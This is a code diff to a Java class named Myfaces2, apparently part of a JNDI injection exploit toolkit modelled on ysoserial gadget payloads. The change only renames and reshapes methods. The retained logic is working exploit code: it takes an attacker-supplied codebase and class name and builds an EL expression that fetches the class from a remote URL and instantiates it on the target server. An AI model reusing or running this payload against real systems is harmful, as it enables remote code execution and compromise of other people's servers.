@@ -4,7 +4,7 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 
 public class Myfaces2 implements ObjectPayload<Object>, DynamicDependencies{
     @Override
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         String command = param[0];
         int sep = command.lastIndexOf(':');
         if (sep < 0) {
@@ -25,10 +25,5 @@ public class Myfaces2 implements ObjectPayload<Object>, DynamicDependencies{
                 + ".toArray(request.getClass().getClassLoader().getURLs())).loadClass('" + className + "').newInstance()}";
 
         return Myfaces1.makeExpressionPayload(expr);
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
     }
 }
